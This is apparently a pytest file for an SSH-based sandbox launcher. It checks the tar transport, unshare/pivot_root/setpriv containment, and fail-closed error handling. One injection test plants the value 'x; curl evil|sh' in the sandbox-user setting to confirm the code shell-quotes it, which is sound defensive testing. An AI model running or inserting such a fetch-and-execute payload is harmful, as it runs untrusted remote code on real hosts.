"""B4.2.5 / VPS SC-3 build: VPSSandboxLauncher — command shape, env config, fail-closed on missing config.

The launcher uses a tar-over-ssh transport (no rsync — the dev host may lack it) and contains the command
with `sudo unshare … --fork -- setpriv --reuid <sbuser> …` (Ubuntu 24.04 AppArmor blocks the unprivileged
`unshare --user --mount` path; verified on the real VPS 2026-06-25).
"""

import io
import sys
import types
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "runtime"))

from devharness.sandbox import vps
from devharness.sandbox.base import SandboxContainmentError
from devharness.sandbox.vps import VPSSandboxLauncher


def _set_env(monkeypatch):
    monkeypatch.setenv("DEVHARNESS_SANDBOX_VPS_HOST", "vps.example.com")
    monkeypatch.setenv("DEVHARNESS_SANDBOX_VPS_USER", "deploy")
    monkeypatch.setenv("DEVHARNESS_SANDBOX_VPS_KEY_PATH", "/keys/id")


class _FakePopen:
    def __init__(self, args, **k):
        self.args = args
        self.stdout = io.BytesIO(b"")  # closeable + the ssh run reads it as stdin

    def wait(self):
        return 0


def _fake_pipe(monkeypatch, run_fn):
    calls = {"popen": [], "run": []}

    def popen(args, **k):
        calls["popen"].append(args)
        return _FakePopen(args)

    def run(args, **k):
        calls["run"].append(args)
        return run_fn(args, **k)

    monkeypatch.setattr(vps.subprocess, "Popen", popen)
    monkeypatch.setattr(vps.subprocess, "run", run)
    return calls


def _ok_run(a, **k):
    # the real remote emits the sentinel on stderr from inside the namespace
    return types.SimpleNamespace(returncode=0, stdout="done", stderr=vps._CONTAINED_SENTINEL + "\n")


def test_constructs_tar_transport_and_sudo_unshare_setpriv(monkeypatch):
    _set_env(monkeypatch)
    calls = _fake_pipe(monkeypatch, _ok_run)

    r = VPSSandboxLauncher().exec(["pytest", "-q"], cwd="/work/repo", timeout_seconds=20)
    assert r.contained is True and r.returncode == 0
    assert vps._CONTAINED_SENTINEL not in r.stderr  # F6: sentinel stripped from the surfaced stderr

    # transport: tar the worktree locally (no rsync)
    assert calls["popen"][0] == ["tar", "-c", "-C", "/work/repo", "."]

    # containment: ssh runs the remote script; -- guards the host (F8)
    ssh_args = calls["run"][0]
    assert ssh_args[0] == "ssh" and "deploy@vps.example.com" in ssh_args
    assert "--" in ssh_args and ssh_args.index("--") < ssh_args.index("deploy@vps.example.com")
    script = ssh_args[-1]
    assert "tar -x -C /tmp/devharness-sandbox" in script
    assert "chown -R devharness-sb:devharness-sb" in script
    assert "sudo unshare --net --pid --mount --uts --fork -- sh -c" in script
    # worktree confinement (Track 1c): pivot_root, worktree bound to /work, then setpriv to the sandbox user
    assert "pivot_root . .oldroot" in script
    assert "mount --rbind /tmp/devharness-sandbox" in script  # worktree -> /work
    # setpriv drops to the sandbox user, then the command runs under the seccomp installer (Track 1d)
    assert "setpriv --reuid devharness-sb --regid devharness-sb --clear-groups -- python3 -c" in script
    assert "pytest -q" in script and "rsync" not in script


def test_contained_is_false_without_the_sentinel(monkeypatch):  # F6
    _set_env(monkeypatch)
    _fake_pipe(monkeypatch, lambda a, **k: types.SimpleNamespace(returncode=1, stdout="", stderr="unshare: denied"))
    r = VPSSandboxLauncher().exec(["echo", "hi"], cwd="/w")
    assert r.contained is False  # no sentinel => containment was NOT established; never claim it


def test_sandbox_user_metachar_is_shell_quoted(monkeypatch):  # F1: no injection via the sandbox-user env
    _set_env(monkeypatch)
    monkeypatch.setattr(vps, "_SANDBOX_USER", "x; curl evil|sh")
    calls = _fake_pipe(monkeypatch, _ok_run)
    VPSSandboxLauncher().exec(["echo", "hi"], cwd="/w")
    script = calls["run"][0][-1]
    assert "'x; curl evil|sh'" in script           # appears only shlex-quoted
    assert "chown -R x; curl" not in script        # never interpolated raw into the sudo shell


def test_missing_config_raises_containment_error(monkeypatch):
    monkeypatch.delenv("DEVHARNESS_SANDBOX_VPS_HOST", raising=False)
    monkeypatch.delenv("DEVHARNESS_SANDBOX_VPS_USER", raising=False)
    monkeypatch.delenv("DEVHARNESS_SANDBOX_VPS_KEY_PATH", raising=False)
    with pytest.raises(SandboxContainmentError):
        VPSSandboxLauncher().exec(["echo", "hi"], cwd="/work")


def test_ssh_unavailable_raises_containment_error(monkeypatch):
    _set_env(monkeypatch)

    def boom(args, **k):
        raise FileNotFoundError("ssh")
    _fake_pipe(monkeypatch, boom)
    with pytest.raises(SandboxContainmentError):
        VPSSandboxLauncher().exec(["echo", "hi"], cwd="/work")
